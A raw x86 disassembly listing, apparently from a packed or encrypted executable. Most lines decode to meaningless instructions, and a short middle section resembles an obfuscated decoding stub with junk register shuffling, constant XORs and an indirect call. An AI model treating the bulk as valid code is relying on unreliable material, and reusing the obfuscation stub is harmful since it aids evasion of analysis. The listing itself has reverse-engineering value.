  408b1c:	adc    eax,0xddfd396e
  408b21:	or     al,0xbf
  408b23:	adc    ebp,DWORD PTR [ebx]
  408b25:	and    ah,dh
  408b27:	scas   al,BYTE PTR es:[edi]
  408b28:	xor    edi,DWORD PTR [edx]
  408b2a:	aaa    
  408b2b:	jnp    0x408ade
  408b2d:	mov    esp,ecx
  408b2f:	pop    ecx
  408b30:	shl    BYTE PTR [ebp+0x1b],cl
  408b33:	fnsave [eax-0x71]
  408b36:	fdiv   QWORD PTR [ebp+0x342a8826]
  408b3c:	inc    edi
  408b3d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b3f:	add    eax,0x3188af64
  408b44:	es mov dh,0x64
  408b47:	adc    DWORD PTR [ebp+0x9c8e42d],esi
  408b4d:	jnp    0x408b84
  408b4f:	xor    ebx,esi
  408b51:	mov    esi,0xcd46676
  408b56:	mov    ds:0x9bd52d69,al
  408b5b:	lahf   
  408b5c:	mov    bh,dl
  408b5e:	push   esp
  408b5f:	outs   dx,BYTE PTR ds:[esi]
  408b60:	sub    al,0x6a
  408b62:	loopne 0x408b3c
  408b64:	adc    eax,0xfba1e6eb
  408b69:	or     al,0x13
  408b6b:	call   0x90a6:0x9ff4e951
  408b72:	xchg   ebx,eax
  408b73:	pause  
  408b75:	push   eax
  408b76:	mov    ah,bh
  408b78:	aas    
  408b79:	icebp  
  408b7a:	add    dh,BYTE PTR [ebx-0x5ea9016d]
  408b80:	adc    BYTE PTR [edx+edi*8-0x68c5fdf6],bl
  408b87:	stc    
  408b88:	std    
  408b89:	and    eax,0x9bbe15ec
  408b8e:	out    dx,eax
  408b8f:	mov    ds:0xd0ce4b44,al
  408b94:	mov    dh,0xd8
  408b96:	sbb    DWORD PTR [ebx-0x46e3f920],ecx
  408b9c:	ja     0x408c01
  408b9e:	aas    
  408b9f:	push   ebx
  408ba0:	adc    edi,DWORD PTR [ebx-0x396bfa24]
  408ba6:	loopne 0x408bc0
  408ba8:	jle    0x408bf2
  408baa:	test   DWORD PTR gs:0x97f3b045,ebx
  408bb1:	jo     0x408b60
  408bb3:	mov    edi,0xf372ec63
  408bb8:	or     DWORD PTR [ebx-0x34],ebp
  408bbb:	mov    ch,0x30
  408bbd:	adc    edi,ecx
  408bbf:	inc    ecx
  408bc0:	pop    eax
  408bc1:	arpl   sp,si
  408bc3:	pop    ecx
  408bc4:	inc    ebp
  408bc5:	ja     0x408c39
  408bc7:	xchg   esp,eax
  408bc8:	adc    al,BYTE PTR [ebx]
  408bca:	call   0xd9ee:0x29ed2b57
  408bd1:	push   ebp
  408bd2:	out    dx,al
  408bd3:	leave  
  408bd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bd5:	inc    ebx
  408bd6:	rcr    al,1
  408bd8:	mov    eax,0xd00137a0
  408bdd:	mov    al,0xf6
  408bdf:	fst    st(6)
  408be1:	fld    TBYTE PTR [edi]
  408be3:	test   eax,0x407d126b
  408be8:	or     al,0x58
  408bea:	scas   eax,DWORD PTR es:[edi]
  408beb:	outs   dx,BYTE PTR ds:[esi]
  408bec:	sbb    ebp,ebx
  408bee:	jae    0x408c09
  408bf0:	dec    esp
  408bf1:	jns    0x408b7e
  408bf3:	or     cl,BYTE PTR [edx+0x35e81288]
  408bf9:	mov    ebp,0xfd0e7b2d
  408bfe:	push   ds
  408bff:	lea    esp,[edi+0x7d3d6b9]
  408c05:	and    ah,BYTE PTR [eax-0x49]
  408c08:	fdiv   QWORD PTR [eax-0x7734a620]
  408c0e:	mov    ebx,0xd7c986
  408c13:	scas   al,BYTE PTR es:[edi]
  408c14:	ficomp WORD PTR [edx]
  408c16:	jp     0x408c06
  408c18:	call   FWORD PTR [edi]
  408c1a:	pop    ecx
  408c1b:	outs   dx,DWORD PTR ds:[esi]
  408c1c:	fs add esp,esi
  408c1f:	dec    ah
  408c21:	add    cl,BYTE PTR ds:0x320274d9
  408c27:	sar    edi,0x33
  408c2a:	or     esi,DWORD PTR [ecx+0x1d]
  408c2d:	cld    
  408c2e:	fcomp  QWORD PTR [ecx+0x1d]
  408c31:	or     BYTE PTR [esi],cl
  408c33:	(bad)  
  408c34:	fimul  DWORD PTR [edx+0x4ff64111]
  408c3a:	out    dx,eax
  408c3b:	xchg   ecx,eax
  408c3c:	pop    eax
  408c3d:	pop    ds
  408c3e:	int3   
  408c3f:	sbb    ebp,DWORD PTR [eax+0x65]
  408c42:	ja     0x408c07
  408c44:	addr16 dec ecx
  408c46:	enter  0xfd53,0xba
  408c4a:	pusha  
  408c4b:	dec    edi
  408c4c:	repnz aam 0x97
  408c4f:	mov    ch,0xbd
  408c51:	dec    edi
  408c52:	ins    BYTE PTR es:[edi],dx
  408c53:	pop    edx
  408c54:	sar    edi,cl
  408c56:	mov    ebx,0x6e335673
  408c5b:	ret    0x2b8a
  408c5e:	xor    eax,0x47ca074a
  408c63:	clc    
  408c64:	cwde   
  408c65:	fist   WORD PTR [eax+ebx*2-0x2cf0db2b]
  408c6c:	aas    
  408c6d:	repz add al,0xbd
  408c70:	dec    esp
  408c71:	jmp    0x790cf97
  408c76:	jae    0x408ce7
  408c78:	dec    esi
  408c79:	in     al,0xdc
  408c7b:	ror    DWORD PTR [edx+0x3e],0xe7
  408c7f:	cld    
  408c80:	xchg   esi,eax
  408c81:	mov    al,ds:0x92b0627
  408c86:	inc    esi
  408c87:	push   edx
  408c88:	push   edi
  408c89:	mov    cs,WORD PTR [edi+ebx*2]
  408c8c:	leave  
  408c8d:	xchg   esi,eax
  408c8e:	push   cs
  408c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c90:	or     dl,ch
  408c92:	dec    edi
  408c93:	std    
  408c94:	pop    eax
  408c95:	mov    ebp,0xb6cdab9d
  408c9a:	mov    bh,0x54
  408c9c:	and    esp,ebx
  408c9e:	fadd   QWORD PTR [ecx+0x6c8ce17b]
  408ca4:	or     eax,0x1de5ed82
  408ca9:	adc    esp,DWORD PTR [edx]
  408cab:	rol    DWORD PTR [esi+0x1760dabf],0xbc
  408cb2:	lds    ebp,FWORD PTR [eax]
  408cb4:	lods   al,BYTE PTR ds:[esi]
  408cb5:	add    bh,BYTE PTR [eax+0x35]
  408cb8:	xchg   esi,eax
  408cb9:	jle    0x408cac
  408cbb:	out    0xdc,al
  408cbd:	pop    ecx
  408cbe:	add    BYTE PTR [edi+0x1aba871],bl
  408cc4:	test   eax,0x101b6afa
  408cc9:	clc    
  408cca:	sbb    bh,BYTE PTR [ebx-0x69eb773a]
  408cd0:	ins    DWORD PTR es:[edi],dx
  408cd1:	mov    ecx,0x9107c796
  408cd6:	push   esi
  408cd7:	sub    al,0xb1
  408cd9:	int3   
  408cda:	pop    ss
  408cdb:	push   es
  408cdc:	push   ebp
  408cdd:	fsubr  QWORD PTR [edi+eiz*2+0x5120524a]
  408ce4:	fisub  WORD PTR [ebx-0x62e7aec3]
  408cea:	push   0x4c6e907f
  408cef:	mov    fs,edx
  408cf1:	xchg   edx,eax
  408cf2:	push   esi
  408cf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cf4:	int3   
  408cf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cf6:	pop    ebx
  408cf7:	sbb    bh,BYTE PTR [edi]
  408cf9:	imul   ebx,DWORD PTR [ebx],0x44
  408cfc:	xchg   edi,eax
  408cfd:	lea    ecx,ds:0xeff416bb
  408d03:	mov    ds:0xdc41850f,eax
  408d08:	(bad)  
  408d09:	dec    DWORD PTR [ebx+0x5e9c6]
  408d0f:	add    BYTE PTR [eax],al
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ffc1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0x6f3327cf
  408e55:	jg     0x408eac
  408e57:	add    eax,0x6262198a
  408e5c:	sub    ebx,DWORD PTR [edi+0x62]
  408e5f:	bound  ecx,QWORD PTR [ecx]
  408e61:	dec    edx
  408e62:	(bad)
  408e65:	push   0xe97273c2
  408e6a:	adc    BYTE PTR [edi+0x38],cl
  408e6d:	test   DWORD PTR [esi-0x62489570],eax
  408e73:	pop    es
  408e74:	xchg   BYTE PTR [esi-0x5d],al
  408e77:	xor    al,0x8f
  408e79:	xchg   ecx,eax
  408e7a:	test   DWORD PTR [ebp+0x26],ecx
  408e7d:	jmp    0x408eba
  408e7f:	aas    
  408e80:	(bad)  
  408e81:	sbb    esp,DWORD PTR [edx+0x5d3e4df5]
  408e87:	test   eax,0x1dc38286
  408e8c:	jge    0x408e86
  408e8e:	pop    ecx
  408e8f:	mov    BYTE PTR [ebp+0x1a],dl
  408e92:	add    al,al
  408e94:	jno    0x408e59
  408e96:	call   0xb2994420
  408e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e9c:	mov    bl,BYTE PTR [edx]
  408e9e:	rcr    al,0xff
  408ea1:	or     BYTE PTR [ebp+0x3b],dh
  408ea4:	pop    ds
  408ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ea6:	sbb    bh,BYTE PTR [edi+0x4ff3386c]
  408eac:	cli    
  408ead:	fcmovne st,st(4)
  408eaf:	dec    esi
  408eb0:	pop    ebx
  408eb1:	lods   eax,DWORD PTR ds:[esi]
  408eb2:	retf   0xe7fa
  408eb5:	cmp    eax,0xe10cd9c6
  408eba:	test   eax,0x8125fc77
  408ebf:	or     esi,esp
  408ec1:	mov    al,ds:0x7cdfcd09
  408ec6:	das    
  408ec7:	imul   edi,DWORD PTR [esi+eax*2],0x4a
  408ecb:	je     0x408f00
  408ecd:	lock pop ebp
  408ecf:	add    dh,BYTE PTR [ebp+0x70008ed1]
  408ed5:	inc    edi
  408ed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ed7:	jecxz  0x408ecd
  408ed9:	push   edi
  408eda:	mov    ah,0xb8
  408edc:	mov    edx,0x10b2b670
  408ee1:	sahf   
  408ee2:	add    cl,BYTE PTR [eax+0x67]
  408ee5:	enter  0xabd,0xc3
  408ee9:	cli    
  408eea:	dec    esi
  408eeb:	adc    edx,DWORD PTR [esi+0x65fbbad6]
  408ef1:	or     dl,BYTE PTR [edx-0x897b39e]
  408ef7:	sub    eax,DWORD PTR [edx+0x2f]
  408efa:	dec    esi
  408efb:	fisubr WORD PTR [ebx]
  408efd:	(bad)  
  408efe:	fstp   QWORD PTR [edx-0x75156b72]
  408f04:	dec    ebp
  408f05:	out    0x5e,al
  408f07:	add    ebx,edx
  408f09:	outs   dx,BYTE PTR ds:[esi]
  408f0a:	lock dec ebx
  408f0c:	xchg   ecx,eax
  408f0d:	inc    esp
  408f0e:	dec    esp
  408f0f:	fsubr  DWORD PTR [ebp+0x6c]
  408f12:	dec    esp
  408f13:	sbb    ah,BYTE PTR [ebx-0x2124f13c]
  408f19:	xchg   edx,eax
  408f1a:	cld    
  408f1b:	sbb    edi,ebx
  408f1d:	and    BYTE PTR [ebx+esi*8],al
  408f20:	pop    ebx
  408f21:	bound  edx,QWORD PTR [ebx+0x759654b3]
  408f27:	mul    ebp
  408f29:	push   ss
  408f2a:	lods   eax,DWORD PTR ds:[esi]
  408f2b:	pop    edx
  408f2c:	scas   eax,DWORD PTR es:[edi]
  408f2d:	sub    eax,0xcb9da8de
  408f32:	mov    dl,0xe7
  408f34:	mov    bh,0x3f
  408f36:	mov    BYTE PTR [edx-0x4c],ah
  408f39:	loop   0x408ef1
  408f3b:	int    0xa6
  408f3d:	or     bl,BYTE PTR [edx+0x64]
  408f40:	or     bh,ah
  408f42:	and    DWORD PTR [esp+edx*8-0x1e26eec2],esp
  408f49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f4a:	xchg   ecx,eax
  408f4b:	iret   
  408f4c:	mov    dh,0x53
  408f4e:	add    eax,0x6178af18
  408f53:	mov    esp,0x9d639a6c
  408f58:	test   BYTE PTR ds:0xc0a86879,0xe2
  408f5f:	in     eax,dx
  408f60:	mov    ebp,0x8465d146
  408f65:	pop    ds
  408f66:	les    edi,FWORD PTR [ecx+0x14]
  408f69:	sbb    al,0xd6
  408f6c:	cmp    al,0xb9
  408f6e:	push   0xffffff9b
  408f70:	pusha  
  408f71:	inc    ecx
  408f72:	imul   edx,esp,0x59b84088
  408f78:	bound  esp,QWORD PTR [ecx]
  408f7a:	inc    ebp
  408f7b:	test   eax,0x603d54c5
  408f80:	ret    
  408f81:	sub    edi,DWORD PTR [eax-0x5f2c220c]
  408f87:	call   0x796d6441
  408f8c:	sahf   
  408f8d:	out    dx,eax
  408f8e:	fadd   QWORD PTR [esi+0x6fc53c2]
  408f94:	movhps QWORD PTR [ebp+0x3d],xmm3
  408f98:	or     DWORD PTR [edi+esi*8+0x497b21e3],esp
  408f9f:	xor    eax,0xfc61324a
  408fa4:	test   BYTE PTR [eax],al
  408fa6:	sbb    al,0x5a
  408fa8:	sti    
  408fa9:	mov    cl,0xfd
  408fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fac:	dec    ecx
  408fad:	fucomp st(0)
  408faf:	jecxz  0x408f3f
  408fb1:	pop    ebp
  408fb2:	arpl   WORD PTR [ecx+0x7d03096c],si
  408fb8:	mov    ecx,0xb1cd3b37
  408fbd:	and    DWORD PTR [edi-0x58],esi
  408fc0:	jne    0x408f56
  408fc2:	fstp   QWORD PTR [esi]
  408fc4:	xchg   edi,eax
  408fc5:	sub    al,0xbf
  408fc7:	push   ss
  408fc8:	push   cs
  408fc9:	sbb    bh,BYTE PTR [esi]
  408fcb:	lods   eax,DWORD PTR ds:[esi]
  408fcc:	and    eax,0x6bda1dc4
  408fd1:	and    edi,DWORD PTR [edx-0x36b889ea]
  408fd7:	dec    ecx
  408fd8:	adc    BYTE PTR [ebx-0x6d487442],al
  408fde:	lods   al,BYTE PTR ds:[esi]
  408fdf:	xchg   esi,eax
  408fe0:	mov    eax,DWORD PTR [edx-0x4ad967d1]
  408fe6:	ret    
  408fe7:	and    BYTE PTR [esp+ebp*1+0x5b],dl
  408feb:	lahf   
  408fec:	data16 jp 0x408fe7
  408fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ff0:	jecxz  0x408f77
  408ff2:	cmp    ch,bl
  408ff4:	into   
  408ff5:	or     BYTE PTR [edi-0x3cafcc2e],0xe2
  408ffc:	jno    0x409030
  408ffe:	push   edi
  408fff:	pushf  
  409000:	js     0x408f85
  409002:	pop    edx
  409003:	add    bh,BYTE PTR [edi]
  409005:	(bad)  
  409006:	cmp    DWORD PTR [ebp+0x1d318da4],eax
  40900c:	or     bh,BYTE PTR [eax+0x45a8d87]
  409012:	cmp    eax,0x6bace75f
  409017:	ficom  WORD PTR [edx+esi*4-0x40]
  40901b:	sub    al,0x8b
  40901d:	(bad)  
  40901e:	push   edi
  40901f:	outs   dx,DWORD PTR ds:[esi]
  409020:	sub    eax,DWORD PTR [eax+0xf]
  409023:	gs mov edi,0x60c9eb3b
  409029:	jo     0x408fdd
  40902b:	pop    eax
  40902c:	or     ecx,esp
  40902e:	jmp    0x7843:0xfd869e4d
  409035:	ret    0x6340
  409038:	repz retf 0x65cf
  40903c:	out    dx,eax
  40903d:	imul   esp,DWORD PTR [edx+0x5c],0xaea103fc
  409044:	or     ebx,edx
  409046:	clc    
  409047:	fwait
  409048:	sub    eax,0x62384173
  40904d:	or     BYTE PTR [ebp+0x66],cl
  409050:	mov    ds:0xc1b0cb4c,al
  409055:	xchg   ebx,eax
  409056:	jl     0x409055
  409058:	sti    
  409059:	enter  0x5f77,0xb7
  40905d:	push   ss
  40905e:	mov    al,ds:0xe229cb36
  409063:	jge    0x4090df
  409065:	mov    esi,0xc64159c3
  40906a:	jg     0x409063
  40906c:	mov    edx,0xbc1baccd
  409071:	or     al,dh
  409073:	call   0x6cbf8112
  409078:	or     DWORD PTR [edi+0x0],ebp
  40907b:	rcl    BYTE PTR cs:[edi],cl
  40907e:	jne    0x409015
  409080:	aam    0x89
  409082:	sub    BYTE PTR [ecx-0x22],bl
  409085:	(bad)  [edi]
  409087:	ins    DWORD PTR es:[edi],dx
  409088:	xchg   ecx,eax
  409089:	ss jns 0x409095
  40908c:	mov    eax,0x468fe302
  409091:	mov    bl,0x8c
  409093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409094:	dec    ecx
  409095:	in     al,dx
  409096:	fnsave [edx+0x56]
  409099:	aad    0xe6
  40909b:	push   es
  40909c:	out    0x4b,al
  40909e:	(bad)  
  40909f:	jns    0x40910c
  4090a1:	and    dh,BYTE PTR ds:0x8028a64
  4090a7:	int    0x16
  4090a9:	sar    DWORD PTR [ebp-0x5400e2f1],cl
  4090af:	mov    eax,ds:0x6929a5e4
  4090b4:	ss push esp
  4090b6:	pop    ecx
  4090b7:	push   eax
  4090b8:	lea    ebx,[esi+0x5c6f899a]
  4090be:	dec    DWORD PTR ds:0x34d570b1
  4090c4:	mov    bl,0xa6
  4090c6:	addr16 xchg ebp,eax
  4090c8:	loope  0x409063
  4090ca:	mov    eax,ds:0xaadf19e9
  4090cf:	jb     0x4090fe
  4090d1:	test   cx,di
  4090d4:	jo     0x40905f
  4090d6:	push   edi
  4090d7:	test   DWORD PTR [eax],ebx
  4090d9:	adc    eax,0x8c954c2
  4090de:	mov    DWORD PTR [edi+0x14],eax
  4090e1:	(bad)  
  4090e3:	mov    ah,0xc2
  4090e5:	xor    bh,BYTE PTR [ebx+0x6a77aae3]
  4090eb:	popf   
  4090ec:	pushf  
  4090ed:	jns    0x409121
  4090ef:	shl    DWORD PTR ds:0x4ba75805,1
  4090f5:	mov    ch,0x68
  4090f7:	call   0xbca2:0x8e52c024
  4090fe:	test   BYTE PTR [edx+eiz*4+0xc],dl
  409102:	pop    ds
  409103:	rol    BYTE PTR [esi],cl
  409105:	add    al,0xed
  409107:	mov    ch,0x29
  409109:	dec    eax
  40910a:	mov    edx,0x2e5a6f14
  40910f:	mov    al,ah
  409111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409112:	add    eax,0x897cf579
  409117:	and    esp,DWORD PTR [esi+0x4e0cf4e7]
  40911d:	push   ebx
  40911e:	push   esp
  40911f:	and    bh,bh
  409121:	popa   
  409122:	push   ecx
  409123:	inc    ecx
  409124:	in     eax,dx
  409125:	ja     0x409118
  409127:	dec    edx
  409128:	in     eax,0xf5
  40912a:	jg     0x4090c6
  40912c:	pop    edx
  40912d:	call   0x94ca53ed
  409132:	jecxz  0x409170
  409134:	dec    edx
  409135:	add    BYTE PTR [edi],ah
  409137:	(bad)
  40913a:	imul   edi,DWORD PTR [ecx-0xda17da3],0x4c4f2622
  409144:	cs loope 0x40919a
  409147:	xchg   bx,ax
  409149:	stos   BYTE PTR es:[edi],al
  40914a:	outs   dx,BYTE PTR ds:[esi]
  40914b:	stos   BYTE PTR es:[edi],al
  40914c:	push   ebx
  40914d:	shl    BYTE PTR [ecx-0x62],1
  409150:	ret    
  409151:	sbb    eax,0x316f540
  409156:	push   esi
  409157:	xchg   ebx,eax
  409158:	in     eax,dx
  409159:	ror    DWORD PTR [ebp+0x1d],0xe
  40915d:	push   es
  40915e:	loope  0x4091dd
  409160:	lock pop eax
  409162:	pop    ds
  409163:	call   0x8c95:0xd04beead
  40916a:	jb     0x40914d
  40916c:	and    bh,BYTE PTR [ebp+0x4b078a98]
  409172:	arpl   WORD PTR [ecx],sp
  409174:	jo     0x409147
  409176:	xor    ebx,DWORD PTR [esi+0x7b97977b]
  40917c:	jecxz  0x4091bf
  40917e:	pusha  
  40917f:	in     eax,dx
  409180:	icebp  
  409181:	lea    edi,[ebp+0x57636c3c]
  409187:	addr16 jbe 0x4091d9
  40918a:	shl    DWORD PTR [eax-0x42],1
  40918d:	and    al,0xb
  40918f:	leave  
  409190:	leave  
  409191:	fild   DWORD PTR [edi]
  409193:	add    eax,0xd93749eb
  409198:	rol    BYTE PTR [edx+0x7c],cl
  40919b:	aad    0x2c
  40919d:	out    0x85,eax
  40919f:	iret   
  4091a0:	sbb    DWORD PTR [esp+edx*2+0x2a],ebp
  4091a4:	inc    esi
  4091a5:	pusha  
  4091a6:	xchg   DWORD PTR [ebx+0x5],esp
  4091a9:	sub    ch,cl
  4091ab:	jae    0x4091b0
  4091ad:	jne    0x40921f
  4091af:	icebp  
  4091b0:	push   ebp
  4091b1:	ror    BYTE PTR [ebx+0x59],0x22
  4091b5:	cmp    ecx,ebp
  4091b7:	or     al,BYTE PTR [ebp-0x426e9581]
  4091bd:	cmc    
  4091be:	jnp    0x4091cf
  4091c0:	pusha  
  4091c1:	inc    esi
  4091c2:	ret    0x9f78
  4091c5:	sbb    bh,BYTE PTR fs:[edi+ebp*1+0x6f0d46c1]
  4091cd:	test   al,0xd8
  4091cf:	xor    eax,0x3b73949
  4091d4:	mov    eax,0x241bede6
  4091d9:	sahf   
  4091da:	test   al,0xc0
  4091dc:	jne    0x4091fa
  4091de:	(bad)  
  4091df:	cmc    
  4091e0:	pop    eax
  4091e1:	fistp  QWORD PTR [ebx+0x60e8f02e]
  4091e7:	ss jmp 0x409216
  4091ea:	push   esi
  4091eb:	inc    DWORD PTR [esi]
  4091ed:	push   cs
  4091ee:	sbb    eax,0x6c9a5a5
  4091f3:	dec    eax
  4091f4:	jmp    0x409224
  4091f6:	inc    eax
  4091f7:	mov    eax,0xbd11824a
  4091fc:	ret    0xa60b
  4091ff:	stc    
  409200:	sbb    ch,BYTE PTR [ecx]
  409202:	retf   
  409203:	jmp    FWORD PTR [eax+0x63]
  409206:	push   ebx
  409207:	aaa    
  409208:	into   
  409209:	jecxz  0x409230
  40920b:	enter  0x60ef,0x29
  40920f:	jle    0x4091b2
  409211:	pop    ecx
  409212:	dec    esp
  409213:	jns    0x40923f
  409215:	xor    eax,0xcaea3fdb
  40921a:	ds call 0xc3b3:0xb2f937e9
  409222:	add    dl,BYTE PTR [ecx+0x61d360d0]
  409228:	or     eax,0xf3149299
  40922d:	fwait
  40922e:	dec    edi
  40922f:	push   esi
  409230:	leave  
  409231:	fcomp  QWORD PTR [ecx-0x4b0d3f4b]
  409237:	jae    0x4092a2
  409239:	scas   eax,DWORD PTR es:[edi]
  40923a:	dec    esi
  40923b:	adc    eax,0x613b5e4b
  409240:	mov    dl,0x55
  409242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409243:	mov    dl,0x61
  409245:	mov    bh,0xf
  409247:	jg     0x4091d7
  409249:	cmp    eax,0x1a7968c9
  40924e:	xacquire xchg BYTE PTR [edx],cl
  409251:	inc    BYTE PTR [edi+0x64]
  409254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409255:	loop   0x4092d4
  409257:	xor    eax,0xe83112d0
  40925c:	lods   al,BYTE PTR ds:[esi]
  40925d:	fwait
  40925e:	jo     0x4092a9
  409260:	ficom  WORD PTR [edx+0x78]
  409263:	add    edx,edx
  409265:	or     al,0xe6
  409267:	pop    ecx
  409268:	xor    BYTE PTR [esi-0x60a5e457],dh
  40926e:	data16 xor BYTE PTR ds:0xbdc9b538,dh
  409275:	and    DWORD PTR [ebx+0x1a],esi
  409278:	adc    bl,0xc0
  40927b:	inc    ecx
  40927c:	sti    
  40927d:	or     BYTE PTR [edx],bh
  40927f:	sbb    DWORD PTR [esi+0x69],esp
  409282:	not    BYTE PTR [edi+ecx*8-0x14317794]
  409289:	iret   
  40928a:	lods   eax,DWORD PTR ds:[esi]
  40928b:	jbe    0x40926d
  40928d:	aad    0xca
  40928f:	in     al,0xf6
  409291:	clc    
  409292:	gs in  eax,0xc8
  409295:	scas   al,BYTE PTR es:[edi]
  409296:	lock cmp al,0x51
  409299:	aas    
  40929a:	adc    eax,0x5255e7b2
  40929f:	mov    bl,BYTE PTR gs:[edi-0x6ba77c1a]
  4092a6:	hlt    
  4092a7:	in     eax,0x82
  4092a9:	mov    fs,WORD PTR [eax]
  4092ab:	fwait
  4092ac:	add    al,0xf0
  4092ae:	out    0x4d,eax
  4092b0:	shr    BYTE PTR [ebp+eiz*8-0xe],1
  4092b4:	mov    ecx,0x692f1495
  4092b9:	add    ebp,DWORD PTR [ebx+0x672edc10]
  4092bf:	xchg   esp,eax
  4092c0:	inc    ecx
  4092c1:	dec    ebp
  4092c2:	lods   al,BYTE PTR ds:[esi]
  4092c3:	add    DWORD PTR [ecx+edx*1-0x2cba46b4],ebx
  4092ca:	inc    esp
  4092cb:	add    eax,DWORD PTR [ebx-0x7f]
  4092ce:	adc    eax,0x4eba6dba
  4092d3:	loope  0x4092af
  4092d5:	test   DWORD PTR [eax+0x7ef8201e],esp
  4092db:	mov    esp,DWORD PTR [esi+0x4]
  4092de:	cmp    al,0xc0
  4092e0:	fld    QWORD PTR [ebp-0xb]
  4092e3:	and    al,0x1c
  4092e6:	mov    ds:0xe72ba3a4,al
  4092eb:	pop    esp
  4092ec:	dec    ecx
  4092ed:	cmp    al,0x55
  4092ef:	lds    esi,FWORD PTR [ecx]
  4092f1:	pop    edi
  4092f2:	push   esp
  4092f3:	repz adc BYTE PTR [edx+esi*8+0xcabb474],0xb5
  4092fc:	dec    edi
  4092fd:	lea    eax,ds:0x334d73b3
  409303:	jb     0x40929b
  409305:	test   BYTE PTR [ecx-0x5e7ed32f],0x9a
  40930c:	dec    edx
  40930d:	or     DWORD PTR [ecx],esi
  40930f:	jmp    0xaf8e:0x5102a2fa
  409316:	pop    edx
  409317:	and    DWORD PTR [esi+esi*1],esi
  40931a:	test   al,0x4
  40931c:	stos   BYTE PTR es:[edi],al
  40931d:	mov    WORD PTR [edi-0x1e],es
  409320:	pop    eax
  409321:	push   edi
  409322:	int    0x10
  409324:	xor    DWORD PTR [edi],ebp
  409326:	call   0x6ac8f9c5
  40932b:	adc    dh,BYTE PTR [ebp+0x202f7c36]
  409331:	mov    BYTE PTR [ebx+0x4a3065f0],al
